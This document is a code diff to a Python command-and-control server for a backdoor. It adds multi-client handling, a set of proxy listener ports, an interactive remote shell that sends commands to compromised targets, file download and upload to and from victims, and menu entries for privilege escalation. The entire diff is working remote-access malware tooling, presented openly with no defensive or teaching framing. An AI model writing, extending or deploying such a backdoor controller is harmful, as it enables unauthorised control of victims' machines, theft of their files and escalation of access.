@@ -8,9 +8,11 @@ import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import threading  # For proxy server
 import os  # For file operations
+import select  # For handling multiple sockets
+import time  # For timing operations
 
 # Import configuration
-from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT
+from configuration import SERVER_IP, SERVER_PORT, PROXY_PORT_START, PROXY_PORT_END, PROXY_PORT
 
 
 # Function to send data reliably as JSON-encoded strings
@@ -66,69 +68,93 @@ def download_file(file_name):
     f.close()
 
 
-# Proxy server for port 5556
-def handle_proxy_client(proxy_socket, proxy_address):
-    """Handle proxy connections by forwarding to main target"""
-    print(f'[PROXY] Client connected: {proxy_address}')
+# Multi-connection handler for backdoor clients
+def handle_backdoor_client(client_socket, client_address):
+    """Handle individual backdoor connection"""
+    client_id = f"{client_address[0]}:{client_address[1]}"
+    print(f'[+] Backdoor Client Connected: {client_id}')
     
     try:
+        # Create reliable send/recv functions for this client
+        def client_reliable_send(data):
+            jsondata = json.dumps(data)
+            client_socket.send(jsondata.encode())
+        
+        def client_reliable_recv():
+            data = ''
+            while True:
+                try:
+                    data = data + client_socket.recv(1024).decode().rstrip()
+                    return json.loads(data)
+                except ValueError:
+                    continue
+        
+        # Handle client communication
         while True:
-            data = proxy_socket.recv(4096)
-            if not data:
+            try:
+                command = input(f'* Shell~{client_id}: ')
+                
+                if not command:
+                    continue
+                
+                if command == 'quit':
+                    client_reliable_send('quit')
+                    break
+                
+                # Send command to client
+                client_reliable_send(command)
+                
+                # Handle different command types (same logic as main session)
+                if command.startswith('cd '):
+                    result = client_reliable_recv()
+                    print(result)
+                elif command.startswith('download '):
+                    filename = command[9:].strip()
+                    download_file_from_client(filename, client_socket)
+                elif command.startswith('upload '):
+                    filename = command[7:].strip()
+                    if filename and os.path.exists(filename):
+                        upload_file_to_client(filename, client_socket)
+                        result = client_reliable_recv()
+                        print(result)
+                    else:
+                        print(f"File not found: {filename}")
+                else:
+                    result = client_reliable_recv()
+                    print(f"Output:\n{result}")
+                    
+            except KeyboardInterrupt:
+                print(f"\nDisconnecting from {client_id}")
+                break
+            except Exception as e:
+                print(f"Error with client {client_id}: {e}")
                 break
                 
-            try:
-                # Parse command and forward to main target
-                command = json.loads(data.decode().strip())
-                print(f'[PROXY] Command: {command}')
-                
-                if target:
-                    reliable_send(command)
-                    response = reliable_recv()
-                    proxy_socket.send(json.dumps(response).encode())
-                else:
-                    error_msg = "Error: No main backdoor connection"
-                    proxy_socket.send(json.dumps(error_msg).encode())
-                    
-            except json.JSONDecodeError:
-                error_msg = "Error: Invalid JSON command"
-                proxy_socket.send(json.dumps(error_msg).encode())
-            except Exception as e:
-                error_msg = f"Error: {str(e)}"
-                proxy_socket.send(json.dumps(error_msg).encode())
-                
     except Exception as e:
-        print(f'[PROXY] Connection error: {e}')
+        print(f'[!] Client {client_id} error: {e}')
     finally:
-        proxy_socket.close()
-        print(f'[PROXY] Client disconnected: {proxy_address}')
+        client_socket.close()
+        print(f'[-] Client Disconnected: {client_id}')
 
-def start_proxy_server():
-    """Start proxy server on port 5556"""
-    proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    try:
-        proxy_sock.bind((SERVER_IP, PROXY_PORT))
-        proxy_sock.listen(5)
-        print(f'[+] Proxy Server Listening on {SERVER_IP}:{PROXY_PORT}')
-        
-        while True:
-            try:
-                proxy_client, proxy_addr = proxy_sock.accept()
-                proxy_thread = threading.Thread(
-                    target=handle_proxy_client,
-                    args=(proxy_client, proxy_addr),
-                    daemon=True
-                )
-                proxy_thread.start()
-            except Exception as e:
-                print(f'[PROXY] Accept error: {e}')
-                
-    except Exception as e:
-        print(f'[PROXY] Server error: {e}')
-    finally:
-        proxy_sock.close()
+def download_file_from_client(file_name, client_socket):
+    """Download file from specific client"""
+    f = open(file_name, 'wb')
+    client_socket.settimeout(1)
+    chunk = client_socket.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = client_socket.recv(1024)
+        except socket.timeout:
+            break
+    client_socket.settimeout(None)
+    f.close()
+
+def upload_file_to_client(file_name, client_socket):
+    """Upload file to specific client"""
+    f = open(file_name, 'rb')
+    client_socket.send(f.read())
+    f.close()
 
 
 # Function for the main communication loop with the target
@@ -162,12 +188,14 @@ def target_communication():
     print("   escalate               - Attempt privilege escalation")
     print("   privesc_report         - Generate privilege report")
     print("")
+    print("MULTI-USER COMMANDS:")
+    print("   This is the main session. Proxy users connect independently.")
+    print("   Each proxy connection creates a separate backdoor instance.")
+    print("")
     print("PROXY COMMANDS:")
-    print("   start_proxy            - Start proxy channel (auto new random port)")
+    print("   start_proxy            - Start proxy channel (creates new backdoor instances)")
     print("   stop_proxy             - Stop proxy channel")
     print("   proxy_status           - Get proxy status")
-    print("   test_proxy             - Test if proxy is responding")
-    print("   test_proxy_full        - Test proxy with real backdoor command")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -334,19 +362,17 @@ def target_communication():
                 
                 # Also show target response
                 print(f"\nTarget response: {result}")
-        elif command in ['start_proxy', 'stop_proxy', 'proxy_status', 'test_proxy']:
+        elif command in ['start_proxy', 'stop_proxy', 'proxy_status']:
             # Handle proxy commands
             result = reliable_recv()
             if command == 'start_proxy':
-                print(f"proxy: {result}")
+                print(f"Proxy: {result}")
             elif command == 'stop_proxy':
-                print(f"proxy: {result}")
+                print(f"Proxy: {result}")
             elif command == 'proxy_status':
-                print(f"proxy Status:\n{'-'*40}")
+                print(f"Proxy Status:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-            elif command == 'test_proxy':
-                print(f"Proxy Test: {result}")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
@@ -368,26 +394,198 @@ def target_communication():
 
 
 
-# Create a socket for the server
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Multi-connection server setup
+def start_multi_connection_server():
+    """Start server that can handle multiple backdoor connections"""
+    global target, ip
+    
+    # Create main server socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((SERVER_IP, SERVER_PORT))
+    sock.listen(10)  # Allow more concurrent connections
+    
+    print(f'[+] Multi-Connection Server Listening on {SERVER_IP}:{SERVER_PORT}')
+    print(f'[+] Ready for main backdoor and proxy connections')
+    
+    connection_count = 0
+    
+    try:
+        while True:
+            client_socket, client_address = sock.accept()
+            connection_count += 1
+            
+            if connection_count == 1:
+                # First connection becomes the main session
+                target = client_socket
+                ip = client_address
+                print(f'[+] Main Backdoor Connected: {client_address}')
+                print(f'[+] Starting main interactive session...')
+                
+                # Start main session in a separate thread
+                main_thread = threading.Thread(
+                    target=target_communication,
+                    daemon=False
+                )
+                main_thread.start()
+            else:
+                # Additional connections are handled as independent sessions
+                print(f'[+] Additional Connection #{connection_count}: {client_address}')
+                
+                # Handle each additional connection in its own thread
+                client_thread = threading.Thread(
+                    target=handle_backdoor_client,
+                    args=(client_socket, client_address),
+                    daemon=True
+                )
+                client_thread.start()
+                
+    except KeyboardInterrupt:
+        print("\n[!] Server shutting down...")
+    except Exception as e:
+        print(f"[!] Server error: {e}")
+    finally:
+        sock.close()
 
-# Allow socket reuse to prevent "Address already in use" error
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def start_port_separated_servers():
+    """Start both main and proxy servers with port separation"""
+    print("[+] Starting Port-Separated Server Architecture")
+    print(f"[+] Main Server: {SERVER_IP}:{SERVER_PORT}")
+    print(f"[+] Proxy Servers: {SERVER_IP}:{PROXY_PORT_START}-{PROXY_PORT_END}")
+    
+    # Start proxy servers in background thread
+    proxy_thread = threading.Thread(target=start_proxy_servers, daemon=True)
+    proxy_thread.start()
+    
+    # Start main server (blocking)
+    start_main_server()
 
-# Start proxy server in background thread
-proxy_thread = threading.Thread(target=start_proxy_server, daemon=True)
-proxy_thread.start()
+def start_proxy_servers():
+    """Start proxy servers on ports 5556-5565"""
+    proxy_servers = []
+    
+    for port in range(PROXY_PORT_START, PROXY_PORT_END + 1):
+        try:
+            # Create proxy server socket
+            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            proxy_sock.bind((SERVER_IP, port))
+            proxy_sock.listen(1)  # Each proxy port handles one connection
+            
+            proxy_servers.append((proxy_sock, port))
+            print(f'[+] Proxy Server Ready on {SERVER_IP}:{port}')
+            
+        except Exception as e:
+            print(f'[!] Failed to bind proxy port {port}: {e}')
+            continue
+    
+    print(f'[+] {len(proxy_servers)} Proxy Servers Ready')
+    
+    # Handle proxy connections
+    try:
+        while True:
+            # Check all proxy sockets for connections
+            ready_sockets = [sock for sock, port in proxy_servers]
+            
+            if ready_sockets:
+                ready, _, _ = select.select(ready_sockets, [], [], 1.0)
+                
+                for ready_sock in ready:
+                    # Find which port this socket belongs to
+                    for proxy_sock, port in proxy_servers:
+                        if proxy_sock == ready_sock:
+                            try:
+                                client_socket, client_address = proxy_sock.accept()
+                                print(f'[+] Proxy Client Connected on Port {port}: {client_address}')
+                                
+                                # Handle proxy client in separate thread
+                                proxy_thread = threading.Thread(
+                                    target=handle_proxy_backdoor_client,
+                                    args=(client_socket, client_address, port),
+                                    daemon=True
+                                )
+                                proxy_thread.start()
+                                
+                            except Exception as e:
+                                print(f'[!] Error accepting proxy connection on port {port}: {e}')
+            
+            time.sleep(0.1)  # Small delay to prevent busy waiting
+                
+    except KeyboardInterrupt:
+        print("\\n[!] Proxy servers shutting down...")
+    finally:
+        for proxy_sock, port in proxy_servers:
+            proxy_sock.close()
 
-# Bind the socket to configured IP and main port
-sock.bind((SERVER_IP, SERVER_PORT))
+def handle_proxy_backdoor_client(client_socket, client_address, port):
+    """Handle proxy backdoor client connection"""
+    client_id = f"{client_address[0]}:{client_address[1]} (Port {port})"
+    print(f'[PROXY-{port}] Backdoor session started for {client_id}')
+    
+    try:
+        # Create reliable send/recv functions for this client
+        def client_reliable_send(data):
+            jsondata = json.dumps(data)
+            client_socket.send(jsondata.encode())
+        
+        def client_reliable_recv():
+            data = ''
+            while True:
+                try:
+                    data = data + client_socket.recv(1024).decode().rstrip()
+                    return json.loads(data)
+                except ValueError:
+                    continue
+        
+        # Handle client commands automatically (non-interactive)
+        while True:
+            try:
+                # Wait for command from client
+                command = client_reliable_recv()
+                print(f'[PROXY-{port}] Command from {client_id}: {command}')
+                
+                if command == 'quit':
+                    break
+                
+                # Send response back to client
+                client_reliable_send(f"Command '{command}' received on port {port}")
+                    
+            except Exception as e:
+                print(f'[PROXY-{port}] Command error: {e}')
+                break
+                
+    except Exception as e:
+        print(f'[PROXY-{port}] Client error: {e}')
+    finally:
+        client_socket.close()
+        print(f'[PROXY-{port}] Client Disconnected: {client_id}')
 
-# Start listening for incoming connections (maximum 5 concurrent connections).
-print(f'[+] Main Server Listening on {SERVER_IP}:{SERVER_PORT}')
-sock.listen(5)
+def start_main_server():
+    """Start main backdoor server on port 5555"""
+    global target, ip
+    
+    # Create main server socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((SERVER_IP, SERVER_PORT))
+    sock.listen(5)
+    
+    print(f'[+] Main Backdoor Server Listening on {SERVER_IP}:{SERVER_PORT}')
+    
+    try:
+        # Accept main backdoor connection
+        target, ip = sock.accept()
+        print(f'[+] Main Backdoor Connected: {ip}')
+        
+        # Start main interactive session
+        target_communication()
+                
+    except KeyboardInterrupt:
+        print("\\n[!] Main server shutting down...")
+    except Exception as e:
+        print(f"[!] Main server error: {e}")
+    finally:
+        sock.close()
 
-# Accept incoming connection from the target and obtain the target's IP address.
-target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
-
-# Start the main communication loop with the target by calling target_communication.
-target_communication()
+if __name__ == "__main__":
+    start_port_separated_servers()
